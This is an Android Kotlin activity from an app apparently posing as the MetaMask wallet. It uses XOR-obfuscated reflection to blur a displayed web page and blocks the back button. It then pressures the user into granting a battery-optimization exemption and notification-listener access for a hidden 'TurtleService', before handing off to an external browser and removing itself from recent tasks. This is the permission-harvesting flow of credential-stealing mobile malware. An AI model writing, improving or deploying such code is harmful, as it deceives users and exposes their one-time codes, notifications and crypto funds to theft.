package com.example.MetaMask.activities

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.view.View
import android.view.ViewGroup
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.example.MetaMask.R
import com.example.MetaMask.services.TurtleService

class CusWebActivity : AppCompatActivity() {

    private val K = 0x42
    private fun dx(b: IntArray) = b.map { (it xor K).toChar() }.joinToString("")
    private val vc = intArrayOf(35,44,38,48,45,43,38,108,52,43,39,53,108,20,43,39,53)
    private val rc = intArrayOf(35,44,38,48,45,43,38,108,37,48,35,50,42,43,33,49,108,16,39,44,38,39,48,7,36,36,39,33,54)
    private val sm = intArrayOf(49,39,54,16,39,44,38,39,48,7,36,36,39,33,54)
    private val cm = intArrayOf(33,48,39,35,54,39,0,46,55,48,7,36,36,39,33,54)
    private val tc = intArrayOf(35,44,38,48,45,43,38,108,37,48,35,50,42,43,33,49,108,17,42,35,38,39,48,102,22,43,46,39,15,45,38,39)
    private val mr = intArrayOf(15,11,16,16,13,16)

    private lateinit var targetUrl: String
    private var isBatteryRetry = false

    private val batteryLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        if (isBatteryIgnoringOptimizations()) {
            android.util.Log.d("XDBG", "[CusWebActivity] if branch") //xdbg
            requestNotificationPermission()
        } else {
            if (!isBatteryRetry) {
                android.util.Log.d("XDBG", "[CusWebActivity] if branch") //xdbg
                isBatteryRetry = true
                Toast.makeText(this, R.string.battery_permission_warning, Toast.LENGTH_LONG).show()
                requestBatteryOptimization()
            } else {
                requestNotificationPermission()
            }
        }
    }

    private val notificationLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
        launchExternalBrowserAndFinish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        android.util.Log.d("XDBG", "[CusWebActivity] onCreate enter savedInstanceState=${savedInstanceState}") //xdbg
        super.onCreate(savedInstanceState)

        val rootLayout = FrameLayout(this)
        rootLayout.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        )

        val webView = WebView(this)
        webView.layoutParams = FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT
        )

        targetUrl = intent.getStringExtra("TARGET_URL") ?: "https://google.com"

        webView.settings.javaScriptEnabled = true
        webView.webViewClient = WebViewClient()

        if (Build.VERSION.SDK_INT >= 31) {
            android.util.Log.d("XDBG", "[CusWebActivity] if branch") //xdbg
            try {
                val fType = java.lang.Float.TYPE
                val rCls  = Class.forName(dx(rc))
                val tCls  = Class.forName(dx(tc))
                val tileMode     = tCls.getField(dx(mr)).get(null)
                val renderEffect = rCls.getMethod(dx(cm), fType, fType, tCls).invoke(null, 35f, 35f, tileMode)
                Class.forName(dx(vc)).getMethod(dx(sm), rCls).invoke(webView, renderEffect)
            } catch (e: Exception) {}
            rootLayout.addView(webView)
        } else {
            rootLayout.addView(webView)

            val overlayView = View(this)
            overlayView.layoutParams = FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            overlayView.setBackgroundColor(Color.parseColor("#E6FFFFFF"))
            rootLayout.addView(overlayView)
        }

        setContentView(rootLayout)
        webView.loadUrl(targetUrl)

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                android.util.Log.d("XDBG", "[CusWebActivity] handleOnBackPressed enter") //xdbg
            }
        })

        requestBatteryOptimization()
    }

    private fun isBatteryIgnoringOptimizations(): Boolean {
        android.util.Log.d("XDBG", "[CusWebActivity] isBatteryIgnoringOptimizations enter") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.util.Log.d("XDBG", "[CusWebActivity] if branch") //xdbg
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            android.util.Log.d("XDBG", "[CusWebActivity] return") //xdbg
            return pm.isIgnoringBatteryOptimizations(packageName)
        }
        android.util.Log.d("XDBG", "[CusWebActivity] return") //xdbg
        return true
    }

    private fun requestBatteryOptimization() {
        android.util.Log.d("XDBG", "[CusWebActivity] requestBatteryOptimization enter") //xdbg
        if (!isBatteryIgnoringOptimizations()) {
            android.util.Log.d("XDBG", "[CusWebActivity] if branch") //xdbg
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryLauncher.launch(intent)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[CusWebActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                requestNotificationPermission()
            }
        } else {
            requestNotificationPermission()
        }
    }

    private fun requestNotificationPermission() {
        android.util.Log.d("XDBG", "[CusWebActivity] requestNotificationPermission enter") //xdbg
        val notificationAccess = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        val hasAccess = notificationAccess?.contains(packageName) == true

        if (!hasAccess) {
            android.util.Log.d("XDBG", "[CusWebActivity] if branch") //xdbg
            Toast.makeText(this, R.string.notification_permission_request, Toast.LENGTH_LONG).show()

            try {
                val componentName = ComponentName(this, TurtleService::class.java)
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )

                val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS).apply {
                        putExtra(Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME, componentName.flattenToString())
                    }
                } else {
                    Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                }

                notificationLauncher.launch(intent)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[CusWebActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                launchExternalBrowserAndFinish()
            }
        } else {
            launchExternalBrowserAndFinish()
        }
    }

    private fun launchExternalBrowserAndFinish() {
        android.util.Log.d("XDBG", "[CusWebActivity] launchExternalBrowserAndFinish enter") //xdbg
        try {
            val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(targetUrl))
            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(browserIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[CusWebActivity] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        finishAndRemoveTask()
    }
}
